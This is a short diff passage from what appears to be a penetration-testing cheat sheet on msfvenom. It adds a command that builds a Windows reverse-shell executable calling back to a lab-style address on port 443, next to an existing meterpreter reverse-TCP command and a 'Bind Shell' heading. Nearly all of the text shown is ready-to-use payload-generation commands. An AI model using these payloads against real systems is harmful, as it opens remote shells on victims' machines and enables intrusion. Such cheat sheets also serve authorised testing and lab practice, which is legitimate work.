@@ -15,6 +15,10 @@ msfvenom -l encoders #Encoders
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
 ```
 
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
+```
+
 ### Bind Shell
 
 ```bash
